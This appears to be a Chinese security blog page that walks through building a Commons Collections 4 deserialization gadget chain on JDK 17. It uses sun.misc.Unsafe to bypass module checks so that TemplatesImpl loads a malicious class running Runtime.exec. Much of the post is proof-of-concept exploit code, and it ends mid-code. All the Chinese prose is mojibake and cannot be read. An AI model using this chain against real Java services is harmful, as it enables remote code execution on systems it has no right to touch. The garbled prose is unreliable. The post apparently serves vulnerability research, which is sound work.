<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>jdk17&amp;CCé“¾ä¸‹åˆ©ç”¨TemplatesImpl | Jiecub3</title>
<meta name="keywords" content="">
<meta name="description" content="0x01 å‰è¨€ èµ·å› çœ‹åˆ°ä¸€ç¯‡æ–‡ç« è¯´jdk17å› ä¸ºå¼ºå°è£…ï¼ˆæ¨¡å—åŒ–ï¼‰ï¼Œåˆ©ç”¨ä¸äº†TemplatesImplæ¥ä½œä¸ºååºåˆ—åŒ–çš„sinkç‚¹äº†ï¼Œäºæ˜¯å»è¯•äº†ä¸‹ã€‚èµ·åˆå…ˆ">
<meta name="author" content="Jiecub3">
<link rel="canonical" href="https://Jiecub3.github.io/zh/posts/java/chain/jdk17cc%E9%93%BE%E4%B8%8B%E5%88%A9%E7%94%A8templatesimpl/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.6498a9db1bad4c0d045c3aa5ba217809694eb596cf8fff3516fcb871a2dfe03e.css" integrity="sha256-ZJip2xutTA0EXDqluiF4CWlOtZbPj/81Fvy4caLf4D4=" rel="preload stylesheet" as="style">
<link rel="icon" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="16x16" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="icon" type="image/png" sizes="32x32" href="https://Jiecub3.github.io/img/logo.gif">
<link rel="apple-touch-icon" href="https://Jiecub3.github.io/logo.gif">
<link rel="mask-icon" href="https://Jiecub3.github.io/logo.gif">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="https://Jiecub3.github.io/zh/posts/java/chain/jdk17cc%E9%93%BE%E4%B8%8B%E5%88%A9%E7%94%A8templatesimpl/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><meta property="og:title" content="jdk17&amp;CCé“¾ä¸‹åˆ©ç”¨TemplatesImpl" />
<meta property="og:description" content="0x01 å‰è¨€ èµ·å› çœ‹åˆ°ä¸€ç¯‡æ–‡ç« è¯´jdk17å› ä¸ºå¼ºå°è£…ï¼ˆæ¨¡å—åŒ–ï¼‰ï¼Œåˆ©ç”¨ä¸äº†TemplatesImplæ¥ä½œä¸ºååºåˆ—åŒ–çš„sinkç‚¹äº†ï¼Œäºæ˜¯å»è¯•äº†ä¸‹ã€‚èµ·åˆå…ˆ" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://Jiecub3.github.io/zh/posts/java/chain/jdk17cc%E9%93%BE%E4%B8%8B%E5%88%A9%E7%94%A8templatesimpl/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2025-01-10T20:01:23+08:00" />
<meta property="article:modified_time" content="2025-01-10T20:01:23+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="jdk17&amp;CCé“¾ä¸‹åˆ©ç”¨TemplatesImpl"/>
<meta name="twitter:description" content="0x01 å‰è¨€ èµ·å› çœ‹åˆ°ä¸€ç¯‡æ–‡ç« è¯´jdk17å› ä¸ºå¼ºå°è£…ï¼ˆæ¨¡å—åŒ–ï¼‰ï¼Œåˆ©ç”¨ä¸äº†TemplatesImplæ¥ä½œä¸ºååºåˆ—åŒ–çš„sinkç‚¹äº†ï¼Œäºæ˜¯å»è¯•äº†ä¸‹ã€‚èµ·åˆå…ˆ"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://Jiecub3.github.io/zh/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "jdk17\u0026CCé“¾ä¸‹åˆ©ç”¨TemplatesImpl",
      "item": "https://Jiecub3.github.io/zh/posts/java/chain/jdk17cc%E9%93%BE%E4%B8%8B%E5%88%A9%E7%94%A8templatesimpl/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "jdk17\u0026CCé“¾ä¸‹åˆ©ç”¨TemplatesImpl",
  "name": "jdk17\u0026CCé“¾ä¸‹åˆ©ç”¨TemplatesImpl",
  "description": "0x01 å‰è¨€ èµ·å› çœ‹åˆ°ä¸€ç¯‡æ–‡ç« è¯´jdk17å› ä¸ºå¼ºå°è£…ï¼ˆæ¨¡å—åŒ–ï¼‰ï¼Œåˆ©ç”¨ä¸äº†TemplatesImplæ¥ä½œä¸ºååºåˆ—åŒ–çš„sinkç‚¹äº†ï¼Œäºæ˜¯å»è¯•äº†ä¸‹ã€‚èµ·åˆå…ˆ",
  "keywords": [
    
  ],
  "articleBody": "0x01 å‰è¨€ èµ·å› çœ‹åˆ°ä¸€ç¯‡æ–‡ç« è¯´jdk17å› ä¸ºå¼ºå°è£…ï¼ˆæ¨¡å—åŒ–ï¼‰ï¼Œåˆ©ç”¨ä¸äº†TemplatesImplæ¥ä½œä¸ºååºåˆ—åŒ–çš„sinkç‚¹äº†ï¼Œäºæ˜¯å»è¯•äº†ä¸‹ã€‚èµ·åˆå…ˆå†™äº†ä¸ªå°demoï¼Œå‘ç°å¯ä»¥è°ƒç”¨å‘€ï¼Œç„¶åå°±æƒ³æä¸€æ¡å®Œæ•´çš„é“¾å­ï¼Œç„¶åè¿™é‡Œé€‰æ‹©çš„æ˜¯CC4ï¼Œå› ä¸ºä»–æœ€åsinkç‚¹å°±æ˜¯TemplatesImpl,å½“ç„¶CC6ï¼ŒCC7ï¼ŒCC5æ”¹æ”¹åº”è¯¥ä¹Ÿå¯ä»¥ï¼ˆCC5èµ·ç‚¹ä¹Ÿè¦æ¢ï¼‰ï¼Œä½†æ˜¯æˆ‘æ‡’å°±ç›´æ¥ç”¨CC4äº†ã€‚åœ¨jdk17 Moduleæ¨¡å¼ä¸‹ï¼ŒCC6å¯ä»¥ç›´æ¥å¥—ä¸€å±‚Unsafeå°±èƒ½ç›´æ¥rceäº†ï¼Œä½†æ˜¯å®ç°åŠ è½½å­—èŠ‚ç å¯ä»¥åšæ›´å¤šäº‹ï¼Œäºæ˜¯ä¿ºç ”ç©¶äº†ä¸‹ï¼Œä¹Ÿæ˜¯è§£å†³é‡é‡å›°éš¾å®ç°äº†æœ€åçš„åˆ©ç”¨ï¼\nç¯å¢ƒ jdk17.0.8 pom.xml javassist javassist 3.12.1.GA org.apache.commons commons-collections4 4.0 jdk17 æ¨¡å—æ£€æµ‹\næ—©åœ¨jdk9å°±å¼€å§‹äº†æ¨¡å—åŒ–ï¼Œä½†æ˜¯çœŸæ­£å®æ–½æ˜¯åœ¨jdk17ã€‚æ¨¡å—åŒ–ç®€å•ç†è§£å°†å°±æ˜¯ javaä¸ºäº†å®‰å…¨æœ‰ä¸€äº›ç±»ä¸æƒ³è®©ä½ ç›´æ¥è°ƒç”¨ï¼Œä½†æ˜¯javaæ¨¡å—é‡Œé¢çš„ç±»åˆéœ€è¦ç›¸äº’è°ƒç”¨ï¼Œæ‰€ä»¥åå°„å’Œnewä¸€ä¸ªå¯¹è±¡çš„æ—¶å€™ä¼šå¯¹è°ƒç”¨ç±»å’Œè¢«è°ƒç”¨ç±»è¿›è¡Œä¸€ä¸ªæ¨¡å—æ£€æµ‹ï¼ˆè¿™é‡Œä¸åªæ˜¯æ£€æµ‹è°ƒç”¨å’Œè¢«è°ƒç”¨ç±»çš„æ¨¡å—å…³ç³»ï¼Œè¿˜æœ‰å…¶ä»–åˆ¤æ–­ï¼‰ï¼Œå¥½è¿™é‡Œæˆ‘ä»¬å¤§æ¦‚æœ‰ä¸ªæ¦‚å¿µï¼Œjdk17 ä¼šè¿›è¡Œæ¨¡å—æ£€æµ‹\n0x02 åˆè§ç«¯å€ª å…ˆæ¥çœ‹ä¸ªå°demoï¼Œè¿™é‡Œéœ€è¦ç”¨åˆ°Unsafeï¼Œä¸æ‡‚çš„åŒå­¦å¯ä»¥å…ˆçœ‹çœ‹è¿™ä¸ªï¼Œç®€å•è¯´Unsafeè¿™é‡Œæ˜¯ç”¨æ¥ä¿®æ”¹æˆ‘ä»¬è°ƒç”¨ç±»çš„æ¨¡å—ï¼Œä»è€Œç»•è¿‡æ¨¡å—æ£€æµ‹ã€‚\nUnsafeæ˜¯ä¸€ä¸ªååº•å±‚çš„å‡½æ•°ï¼Œæˆ‘ä»¬è¿™é‡Œæ˜¯é€šè¿‡æ‰¾åˆ°Fieldçš„åœ°å€ï¼Œç„¶åä¿®æ”¹å…¶æŒ‡å‘æˆ‘ä»¬è®¾ç½®çš„å€¼\nTemplatesImpl test import javassist.ClassPool; import javassist.CtClass; import sun.misc.Unsafe; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Base64; import java.util.HashMap; public class test_17 { public static void main(String[] args) throws Exception { System.out.println(Class.class.getModule().getName()); ClassPool pool = ClassPool.getDefault(); ClassLoader appClassLoader = ClassLoader.getSystemClassLoader(); pool.insertClassPath(new javassist.LoaderClassPath(appClassLoader)); CtClass clazz = pool.get(\"eval\"); byte[] code = clazz.toBytecode(); CtClass clazz2 = pool.get(Evil.class.getName()); byte[] code2 = clazz2.toBytecode(); System.out.println(Base64.getEncoder().encodeToString(code)); Class\u003c?\u003e aClass = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"); patchModule(test_17.class,aClass); System.out.println(test_17.class.getModule().getName()); Object o = aClass.getDeclaredConstructor().newInstance(); setFiled(o,\"_name\",\"111\"); setFiled(o,\"_bytecodes\",new byte[][]{code,code2}); setFiled(o,\"_transletIndex\",0); //setFiled(o,\"_auxClasses\",new HashMap\u003c\u003e()); FileOutputStream fos = new FileOutputStream(\"bin\"); ObjectOutputStream oos = new ObjectOutputStream(fos); oos.writeObject(o); oos.close(); patchModule(test_17.class,eval.class); System.out.println(test_17.class.getModule().getName()); // ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–å¯¹è±¡ FileInputStream fis = new FileInputStream(\"bin\"); ObjectInputStream ois = new ObjectInputStream(fis); Templates o1 = (Templates) ois.readObject(); o1.getOutputProperties(); ois.close(); } private static void patchModule(Class clazz,Class goalclass){ try { Class UnsafeClass = Class.forName(\"sun.misc.Unsafe\"); Field unsafeField = UnsafeClass.getDeclaredField(\"theUnsafe\"); unsafeField.setAccessible(true); Unsafe unsafe = (Unsafe)unsafeField.get(null); Object ObjectModule = Class.class.getMethod(\"getModule\").invoke(goalclass); Class currentClass = clazz; long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(\"module\")); unsafe.getAndSetObject(currentClass,addr,ObjectModule); } catch (Exception e) { } } public static void setFiled(Object templates, String name, Object values) throws IllegalAccessException, NoSuchFieldException { Field declaredField = templates.getClass().getDeclaredField(name); declaredField.setAccessible(true); declaredField.set(templates,values); } } demoä¸­åœ¨åå°„å‰æ‰§è¡ŒpatchModule(test_17.class,aClass);ä¿®æ”¹æ¨¡å—ï¼Œç„¶åååºåˆ—åŒ–åè°ƒç”¨getOutputPropertiesè§¦å‘sinkï¼Œç„¶åè¿™é‡Œç”Ÿæˆbinæ–‡ä»¶åï¼Œæ³¨é‡Šæ‰å‰é¢ä»£ç ï¼Œæ‰§è¡Œreadobjectæ˜¯å¯ä»¥æ‰§è¡ŒæˆåŠŸçš„ã€‚è¿™é‡Œæˆ‘å°±æ„Ÿè§‰å¥½åƒè·Ÿæˆ‘æƒ³çš„æœ‰ç‚¹ä¸ä¸€æ ·äº†ï¼Œæˆ‘ä¹‹å‰çœ‹é‚£ç¯‡æ–‡ç« ä»¥ä¸ºåªè¦å®ä¾‹åŒ–ç±»å°±ä¼šè¿›è¡Œæ¨¡å—çš„æ£€æµ‹ã€‚ä½†æ˜¯å¾ˆæ˜¾ç„¶è¿™é‡Œè‚¯å®šæ²¡æœ‰ã€‚\n0x03 æ„é€  ç„¶åå°±å¼€å§‹å°è¯•æ„é€ äº†\n1.eval.class é¦–å…ˆæ˜¯æ¶æ„ç±»ï¼Œè¿™é‡Œæˆ‘æ²¡æœ‰ç»§æ‰¿AbstractTransletï¼Œå› ä¸ºæœ‰æ¨¡å—æ£€æµ‹é‚£ä¸ªä¸œè¥¿ï¼Œåæ­£æˆ‘å½“æ—¶å¾ˆå¤šæŠ¥é”™ï¼Œæˆ‘å°±ç›´æ¥åˆ äº†ï¼Œè¿™é‡Œåˆ†æä»£ç å¯ä»¥ç”¨å¦ä¸€ç§æ–¹æ³•ä»£æ›¿\nimport java.io.IOException; public class eval { static { try { Runtime.getRuntime().exec(\"calc\"); } catch (IOException e) { throw new RuntimeException(e); } } public Class\u003c?\u003e getSuperclass(){ return eval.class; } } å°è¯•\nå¼€å§‹å°è¯•è¿‡é‡å†™getSuperclass()æ–¹æ³•ç»•è¿‡ifåˆ¤æ–­ï¼Œåé¢å‘ç°é‡å†™ä¸äº†è¿™ä¸ªï¼ŒåŸå› åº”è¯¥æ˜¯ï¼šè¿™é‡Œ_class[i]å±äºClasså¯¹è±¡ï¼Œç„¶åClassæ˜¯finalä¸è®©ç»§æ‰¿ï¼Œç„¶åä¹Ÿå°±é‡å†™ä¸äº†äº†\nè§£å†³\né‚£ä¹ˆè¿™é‡Œä¼šè¿›å…¥elseï¼Œ_auxClassesæ­£å¸¸æ˜¯nullæ‰€ä»¥è¿™é‡Œä¼šç©ºæŒ‡é’ˆæŠ¥é”™ã€‚ä½†æ˜¯è¿™ä¸ªå€¼ä¸èƒ½åå°„è®¾ç½®ï¼Œè¿™ä¸ªå€¼æœ€åè¿˜æ˜¯å±äºHashtableï¼Œä½†æ˜¯Hashtableä¸ç»§æ‰¿Serializableã€‚é‚£å°±çœ‹é‚£äº›åœ°æ–¹ä¼šå¯¹è¿™ä¸ªå€¼è¿›è¡Œèµ‹å€¼ï¼Œçœ‹æˆ‘ä»¬èƒ½ä¸èƒ½è°ƒç”¨åˆ°\nå‘ç°å°±åœ¨defineTransletClasses()ä¸Šæ–¹å°±æœ‰ï¼Œåªè¦_bytecodes.length\u003e1å°±è¡Œï¼Œezå¾ˆå¥½æ»¡è¶³\nsetFiled(templates,\"_bytecodes\",new byte[][]{code,code2}); è¿™æ ·è®¾ç½®å°±è§£å†³äº†ï¼Œç„¶åä»¥ä¸ºå¥—ä¸€å±‚Unsafeå°±èƒ½å®ç°æ—¶ï¼Œæœ€å¤§çš„é—®é¢˜æ¥äº†\n2. boss newInstance åœ¨transformæœ€åè°ƒç”¨ç‚¹ï¼ŒTrAXFilterçš„å®ä¾‹åŒ–æ˜¯é€šè¿‡newInstanceå®ç°ï¼Œè€Œè¿™ä¸ªå±äºåå°„ï¼Œè¿™é‡Œä¼šè¿›è¡Œæ¨¡å—æ£€æµ‹ï¼ï¼ï¼\nèµ·åˆåœ¨pocä¸­å†™å¥patchModule(invokerTransformer.getClass(),aClass);ï¼ˆaClasså°±æ˜¯TrAXFilter.classï¼‰ï¼Œå¯ä»¥æˆåŠŸè°ƒç”¨ï¼Œä½†æ˜¯ä¸‹æ„è¯†å°±ååº”åˆ°è¿™æ˜¯æœ¬åœ°ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯æ˜¯ä¸€ä½“çš„ã€‚ç›¸å½“äºè¿™ä¸ªä¹Ÿä¿®æ”¹äº†æœåŠ¡ç«¯invokerTransformerçš„æ¨¡å—hhhã€‚\nç„¶åè¿™é‡Œæ²‰æ€äº†ä¸‹ï¼Œèƒ½ä¸èƒ½é€šè¿‡CCé“¾ä¸­Transformer[]çš„æ„é€ æ‰§è¡ŒpatchModule()ä¸­çš„ä»£ç ï¼ˆUnsafeé‚£å—ä»£ç ï¼Œä¿®æ”¹æ¨¡å—ï¼‰ï¼Œä¿®æ”¹å®Œæ¨¡å—ç„¶åå†è°ƒç”¨CC4åé¢çš„sinkï¼Œç„¶åæ‹¼æ¥åˆ°ä¸€ä¸ªTransformer[]é‡Œé¢è¿›è¡Œåˆ©ç”¨\nç„¶åçœ‹äº†ä¸‹ConstantTransformerï¼Œå‘ç°è¿”å›çš„å¯¹è±¡ï¼Œå’Œæ¥æ”¶inputæ²¡åŠæ¯›é’±å…³ç³»ï¼Œæ‰€ä»¥ä¸Šé¢æƒ³æ³•æ˜¯å¯è¡Œçš„\npublic O transform(final I input) { return iConstant; } 2.1 æ€ä¹ˆå®ç°Unsafe è¯´å¹²å°±å¹²ï¼Œæ…¢ç€ï¼Œä½ æ˜¯è¯´ç”¨invokerTransformeræ¥å®ç°ä¸‹é¢è¿™æ®µä»£ç ï¼Ÿ\nprivate static void patchModule(Class clazz,Class goalclass){ try { Class UnsafeClass = Class.forName(\"sun.misc.Unsafe\"); Field unsafeField = UnsafeClass.getDeclaredField(\"theUnsafe\"); unsafeField.setAccessible(true); Unsafe unsafe = (Unsafe)unsafeField.get(null); Object ObjectModule = Class.class.getMethod(\"getModule\").invoke(goalclass); Class currentClass = clazz; long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(\"module\")); unsafe.getAndSetObject(currentClass,addr,ObjectModule); } catch (Exception e) { } } æˆ‘ä»¬åŒ–ç®€ï¼Œä¹Ÿå°±æ˜¯è¦æ‰§è¡Œunsafe.getAndSetObject(currentClass,addr,ObjectModule);è¿™å¥ä»£ç \né‚£å°±è¦å¥½å¥½ç†è§£invokerTransformer.transformä¸­çš„é€»è¾‘äº†\npublic O transform(final Object input) { //åŒ–ç®€ä¸‹ final Class\u003c?\u003e cls = input.getClass(); final Method method = cls.getMethod(iMethodName, iParamTypes); return (O) method.invoke(input, iArgs); å°è¯• é‚£æˆ‘ä»¬èƒ½ä¸èƒ½ç›´æ¥ä¼ ä¸ªUnsafeå¯¹è±¡å‘¢ï¼Ÿno Unsafeä¸èƒ½ååºåˆ—åŒ–\nåé¢æƒ³åˆ°getRuntime,ç„¶åå»çœ‹å‘ç°æœ‰getUnsafeå¯ä»¥è·å¾—Unsafeå¯¹è±¡ ä½†æ˜¯å…¶å®ç”¨ä¸äº†hhhï¼Œä¸ç„¶å¹²å˜›è¿˜é€šè¿‡åå°„è·å¾—Unsafeå¯¹è±¡å˜›hhhã€‚è¯¥æ–¹æ³•è¿˜æœ‰@CallerSensitiveè¿™ä¸ªæ³¨é‡Šä¼šå¯¹è°ƒç”¨è€…çš„classLoaderè¿›è¡Œæ£€æŸ¥ï¼Œåˆ¤æ–­å½“å‰ç±»æ˜¯å¦ç”±Bootstrap classLoaderåŠ è½½ï¼Œå¦‚æœä¸æ˜¯çš„è¯å°±ä¼šæŠ›å‡ºä¸€ä¸ªSecurityExceptionå¼‚å¸¸ã€‚\nå› ä¸ºå—åˆ°Runtimeçš„æ„é€ å’Œfinal Class\u003c?\u003e cls = input.getClass();è¿™å¥ä»£ç çš„å½±å“ï¼Œæˆ‘ä¸€ç›´è§‰å¾—è¦å¾—åˆ°Unsafeå¯¹è±¡æ‰èƒ½è¿›è¡Œè°ƒç”¨ã€‚å› ä¸ºä½ ä¼ å…¥çš„Unsafe.classç»è¿‡input.getClass()ï¼Œéƒ½ä¼šå˜æˆClass.classï¼Œä¼šæ²¡æœ‰ç”¨çš„ã€‚æˆ‘æ˜¨å¤©è¿™é‡Œä¸€åº¦ä»¥ä¸ºæ— è§£äº†hhh åé¢æˆ‘ä¸€ç›´çœ‹ä»£ç ï¼Œå‘ç°getRuntimeè´¹é‚£ä¹ˆå¤§åŠ²æ˜¯å› ä¸ºClassæ²¡è¿™ä¸ªæ–¹æ³•ï¼Œä½†æ˜¯æœ‰getDeclaredFieldï¼ŒsetAccessibleè¿™äº›æ–¹æ³•ã€‚è€ŒRuntimeå¯¹è±¡ä¹Ÿæ˜¯ä¸ºäº†execçš„è°ƒç”¨ï¼Œå¹¶ä¸æ˜¯å‰é¢å°±è¦æœ‰å¯¹è±¡æ‰èƒ½è°ƒç”¨ã€‚è€Œä¸”å‰é¢è°ƒç”¨(Field unsafeField = UnsafeClass.getDeclaredField(\"theUnsafe\");)æœ¬æ¥å°±æ˜¯é€šè¿‡Unsafe.classè°ƒç”¨çš„ï¼Œè€Œä¸æ˜¯Unsafeå¯¹è±¡è°ƒç”¨çš„ï¼Œæ€ä¹ˆå°±ä¸èƒ½è°ƒç”¨äº†ï¼Ÿ\nè¿™ä¸ªæƒ³æ³•é€šå°è¯•å‘ç°æ˜¯å¯ä»¥ï¼Œä½†æ˜¯åˆæœ‰ä¸ªé—®é¢˜ unsafeField.setAccessible(true); Unsafe unsafe = (Unsafe)unsafeField.get(null); theUnsafeæ˜¯privateï¼ŒsetAccessibleè¿™ä¸ªè°ƒç”¨ä¸èƒ½å°‘ï¼Œå°±æ„å‘³ç€unsafeFieldè¿™ä¸ªFiledå¯¹è±¡å¾—è¢«è°ƒç”¨ä¸¤æ¬¡ï¼Œä½†æ˜¯è¿™åœ¨invokerTransformerä¸­æ€ä¹ˆå¯èƒ½å®ç°å‘¢ï¼Ÿäºæ˜¯æˆ‘æƒ³äº†èƒ½ä¸èƒ½åœ¨å¤–é¢æ‰§è¡ŒunsafeField.setAccessible(true);ï¼Œç„¶åæŠŠunsafeFieldä¼ åˆ°invokerTransformerä¸­ï¼Œå…¶å®ä¸è¡ŒFieldä¹Ÿä¸ç»§æ‰¿Serializableå•Šï¼Œæƒ³påƒå‘¢hhh\nè§£å†³ ç„¶ååˆæ€è€ƒäº†ç‰‡åˆ»ï¼Œå¦‚æœé é“¾å­è§£å†³çš„è¯ï¼Œé‚£å¤§æ¦‚éœ€è¦ä¸€ä¸ªè¿™æ ·çš„ç»“æ„å§\npublic T transform(final T input) { iTransformer.transform(input); return input; } è¿™é‡ŒiTransformer.transform(input);å»æ‰§è¡ŒunsafeField.setAccessible(true);è¿™æ®µå†…å®¹ï¼Œæ‰§è¡Œå®Œåè¿˜èƒ½è¿”å›ä¹‹å‰çš„å¯¹è±¡ï¼Œåé¢æ­£å¸¸è°ƒç”¨ã€‚è¿™æ ·å¤§æ¦‚å°±èƒ½å®ç°åŒä¸€ä¸ªå¯¹è±¡è¢«è°ƒç”¨2æ¬¡äº†ï¼\nç„¶åæˆ‘å°±å»æ‰¾å®ç°transformæ–¹æ³•çš„ç±»ï¼Œå…¶å®ä¸å¤šï¼Œä½†æ˜¯æ‰¾ä¸‹æ¥åŸºæœ¬ä¸Šæ²¡ä»€ä¹ˆåŠç”¨ï¼Ÿä½†æ˜¯æ³¨æ„åˆ°æœ‰ä¸€äº›ç±»æœ‰executeï¼Œevaluateæ–¹æ³•ï¼Œä½†æ˜¯å®ç°transformæ–¹æ³•çš„ç±»é‡Œé¢åˆæ²¡çœ‹åˆ°é‚£ä¸ªå¯¹è¿™ä¸ªä¸¤ä¸ªæ–¹æ³•è¿›è¡Œäº†è°ƒç”¨ã€‚è¿™é‡Œç¨å¾®æœ‰ç‚¹è¹Šè··äº†ï¼Œç„¶ååˆå»ç½‘ä¸Šæ‰¾äº†ä¸‹æ€è·¯ï¼Œå°±çœ‹åˆ°ä¹‹å‰CCæ”¹ç¼–çš„ä¸€äº›é“¾å­ã€‚ç„¶åçœ‹åˆ°ä¸€ä¸ªå¯¹create()æ–¹æ³•çš„è°ƒç”¨ï¼Œç„¶åè¿™ä¸ªç±»å…¶å®æ²¡å®ç°transformï¼Œä½†æ˜¯ä»–æœ‰create()ã€‚è¿™é‡Œæˆ‘ä¹Ÿæœ‰ç‚¹æ„Ÿè§‰äº†é‚£executeï¼Œevaluateæ–¹æ³•ä¹Ÿå¾ˆæœ‰å¯èƒ½æ˜¯æƒ³ç”¨ä¸€ä¸ªåŒ…ä¸‹çš„ç±»ï¼Œäºæ˜¯æˆ‘å°±å»è¿™ä¸ªåŒ…ä¸‹é¢ä¸€é€šæ‰¾ï¼Œhhhå¦‚æœè®©æˆ‘å‘ç°äº†ç‚¹ä»€ä¹ˆhhh\næˆ‘ä¹‹æ‰€ä»¥ä¼šæœ‰ä¸Šé¢è¿™ä¸ªæƒ³æ³•ï¼Œä¹Ÿæ˜¯æ‰¾transform()æ–¹æ³•çš„æ—¶å€™ï¼Œçœ‹åˆ°ä¸‹é¢è¿™ä¸¤ä¸ªè°ƒç”¨ï¼Œå°±å¾ˆç¬¦åˆæˆ‘çš„æ€è·¯ï¼ˆçœ‹ä»£ç æ³¨é‡Šï¼ï¼‰\nClosureTransformer public T transform(final T input) { iClosure.execute(input); //åªè¦executeä¸­å¯ä»¥æ§åˆ¶è°ƒç”¨transformï¼Œå³å¯ return input; } IfTransformer public O transform(I input) { return this.iPredicate.evaluate(input) ? this.iTrueTransformer.transform(input) : this.iFalseTransformer.transform(input); //å› ä¸ºè¿™é‡Œæ˜¯ä¸‰å…ƒè¡¨è¾¾å¼ï¼Œæ‰€ä»¥å…¶å®ä¼šæ‰§è¡Œä¸¤å¥ä»£ç  //æ‰€ä»¥è¿™é‡Œ evaluate(input) å¯ä»¥æ§åˆ¶è°ƒç”¨transformï¼Œå³å¯ } ç„¶åå…¶å®æ„Ÿè§‰æ‰¾åˆ°äº†å¾ˆå¤šå¯ä»¥ç”¨çš„ã€‚å…ˆå†™æ¯”è¾ƒéº»çƒ¦çš„å§ï¼Œå› ä¸ºå¥½ç”¨çš„éƒ½æ˜¯åé¢æ‰é‡åˆ°wwww(è°ƒç”¨æƒ³æ³•å°±å†™åˆ°ä»£ç æ³¨é‡Šé‡Œå§æ–¹ä¾¿ç‚¹\næ‰¾åˆ°çš„ä¸€äº›ç±» ComparatorPredicate public boolean evaluate(final T target) { boolean result = false; final int comparison = comparator.compare(object, target);//è¿™é‡Œæ˜¯çœ‹åˆ°äº†compareï¼Œç„¶åCC4è¿™æ¡é“¾å­ä¹Ÿæ˜¯æœ‰è¿™ä¸ªè°ƒç”¨ç‚¹ï¼Œç„¶åæƒ³èƒ½ä¸èƒ½é€šè¿‡è¿™é‡Œè°ƒç”¨åˆ°transformï¼Œçœ‹äº†ä¸‹compare()ç›¸å…³ä»£ç æ„Ÿè§‰æ˜¯å¯è¡Œçš„ä½†æ˜¯æœ‰ç‚¹éº»çƒ¦ switch (criterion) { case EQUAL: result = comparison == 0; break; case GREATER: result = comparison \u003e 0; break; case LESS: result = comparison \u003c 0; break; case GREATER_OR_EQUAL: result = comparison \u003e= 0; break; case LESS_OR_EQUAL: result = comparison \u003c= 0; break; default: throw new IllegalStateException(\"The current criterion '\" + criterion + \"' is invalid.\"); } return result; } EqualPredicate public boolean evaluate(final T object) { if (equator != null) { return equator.equate(iValue, object); //è¿™ä¸ªæ˜¯æƒ³åˆ°equateï¼Œequalsä¹Ÿæœ‰ç›¸å…³çš„é“¾å­ï¼Œè¿™ä¸ªæœªè¯å®ï¼Œæ„Ÿè§‰æœ‰å°±è®°å½•äº† } else { return iValue.equals(object); } } æ¯”è¾ƒå¥½ç”¨çš„ TransformerPredicate public boolean evaluate(final T object) { final Boolean result = iTransformer.transform(object);//è¿™ä¸ªéœ€è¦æœ‰ç»“æœï¼Œä½†æ˜¯setAccessibleè¿”å›æ˜¯voidï¼Œæ‰€ä»¥è¿™ä¸ªå¯èƒ½ç”¨ä¸äº† if (result == null) { throw new FunctorException( \"Transformer must return an instanceof Boolean, it was a null object\"); } return result.booleanValue(); } å¥½ç”¨çš„\nTransformedPredicate public boolean evaluate(final T object) { final T result = iTransformer.transform(object); //è¿™é‡Œä¸å°±å®Œç¾äº†ä¹ˆhhh return iPredicate.evaluate(result); } TruePredicate public boolean evaluate(final T object) { return true; //è¿™ä¸ªæ§åˆ¶ä¸‹iPredicate.evaluate(result);ç»“æœï¼Œå¢åŠ é“¾å­ç¨³å®šæ€§ } æœ€å¥½ç”¨çš„\nè¿™ä¸ªæ˜¯æˆ‘å”¯ä¸€è®°å½•çš„ä¸€ä¸ªexecuteæ–¹æ³•çš„ï¼Œä½†ç¡®å®æœ€å¥½ç”¨çš„wwwï¼Œä¸æ˜¯å“¥ä»¬ï¼Ÿä½ ç›´æ¥å°±æ˜¯æ¢¦ä¸­æƒ…execute\nTransformerClosure public void execute(final E input) { iTransformer.transform(input); } demo é‚£ä¹ˆæˆ‘æœ€åé€‰æ‹©äº†è¿™å¥—ç»„åˆ\nClosureTransformer public T transform(final T input) { iClosure.execute(input); return input; } TransformerClosure public void execute(final E input) { iTransformer.transform(input); } å¯ä»¥æˆåŠŸå¾—åˆ°Unsafeå¯¹è±¡ï¼Œniceæï¼Œè¿™é‡Œæˆ‘å°±ç›´æ¥æ‹¿æˆ‘æµ‹è¯•çš„pocäº†\nimport org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.*; import sun.misc.Unsafe; import javax.xml.transform.Templates; import java.io.FileInputStream; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.lang.reflect.Method; public class test { public static void main(String[] args) throws Exception { Class UnsafeClass = Class.forName(\"sun.misc.Unsafe\"); Field unsafeField = UnsafeClass.getDeclaredField(\"theUnsafe\"); unsafeField.setAccessible(true); Unsafe unsafe = (Unsafe)unsafeField.get(null); Class\u003c?\u003e TrAXFilter = Class.forName(\"com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter\"); Object ObjectModule = Class.class.getMethod(\"getModule\").invoke(TrAXFilter); long addr=unsafe.objectFieldOffset(Class.class.getDeclaredField(\"packageName\")); // // System.out.println(addr); // System.out.println(Class.class.getModule().getClass()); // System.out.println(\"1111\"+TrAXFilter.getPackageName()); // unsafe.getAndSetObject(TrAXFilter,addr,\"javax.xml\"); // System.out.println(Class.class.getDeclaredField(\"packageName\")); // System.out.println(ObjectModule); // 